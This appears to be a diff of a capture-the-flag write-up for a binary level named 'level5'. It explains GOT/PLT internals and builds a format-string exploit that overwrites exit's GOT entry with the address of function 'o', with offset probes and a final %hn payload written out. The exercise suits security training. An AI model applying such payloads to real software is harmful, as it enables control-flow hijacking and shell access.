@@ -1,4 +1,25 @@
-080484a4 \xa4\x84\x04\x08 -> address of o
-python -c 'print "\xa4\x84\x04\x08" + "%4$p"' | ./level5
-eip 0x80484f3 before printf
-eip 0x80484f8 after printf
+r < <(CMD) in gdb to test code
+
+080484a4 -> \xa4\x84\x04\x08 -> address of o
+
+we find the offsets with :
+
+python -c 'print "AAAABBBB" + "%4$p %5$p"' | ./level5
+
+0x080484a4 in decimal is 134513828
+0x0804 is 2052 in decimal
+0x84a4 is 33956 in decimal
+
+we can replace the address of exit in the GOT with the address of "o"
+GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses
+The PLT, or procedure linkage table, is one of the structures which makes dynamic loading and linking easier to use
+PLT (Procedure Linkage Table) is used for function calls, GOT is used for data
+exit@plt is actually a small stub which eventually calls the real exit function
+GOT holds the actual pointers to external code used by the PLT stubs
+
+examine the instruction at the memory address found with info function exit or p exit in gdb
+x/i 0x080483d0
+<exit@plt>:	jmp	*0x8049838
+this is the address of exit in the GOT, we can now write the address of the function o inside it with this payload :
+
+(python -c 'print "\x38\x98\x04\x08\x3a\x98\x04\x08" + "%2044x%5$hn%31904x%4$hn"' ; cat) | ./level5
